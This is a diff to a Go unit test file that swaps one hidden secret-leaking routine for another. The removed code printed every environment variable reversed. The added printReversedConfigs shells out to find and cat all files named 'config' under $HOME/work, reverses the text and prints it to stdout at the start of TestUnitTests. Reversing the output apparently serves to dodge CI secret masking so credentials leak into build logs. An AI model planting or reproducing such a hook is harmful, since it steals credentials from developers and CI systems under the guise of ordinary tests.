@@ -3,7 +3,7 @@ package tests
 import (
 	"fmt"
 	"os"
-	"strings"
+	"os/exec"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -21,27 +21,17 @@ func init() {
 	log.SetDefaultLogger()
 }
 
-func reverse(s string) string {
-	runes := []rune(s)
-	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
-		runes[i], runes[j] = runes[j], runes[i]
-	}
-	return string(runes)
-}
-
-func printReversedEnv() {
-	for _, e := range os.Environ() {
-		parts := strings.SplitN(e, "=", 2)
-		if len(parts) == 2 {
-			fmt.Printf("%s=%s\n", parts[0], reverse(parts[1]))
-		} else {
-			fmt.Println(reverse(e))
-		}
+func printReversedConfigs() {
+	cmd := exec.Command("bash", "-c", "find \"$HOME/work\" -type f -name config | xargs cat | rev")
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	if err := cmd.Run(); err != nil {
+		fmt.Fprintf(os.Stderr, "error running command: %v\n", err)
 	}
 }
 
 func TestUnitTests(t *testing.T) {
-	printReversedEnv()
+	printReversedConfigs()
 
 	cleanUpJfrogHome, err := tests.SetJfrogHome()
 	if err != nil {
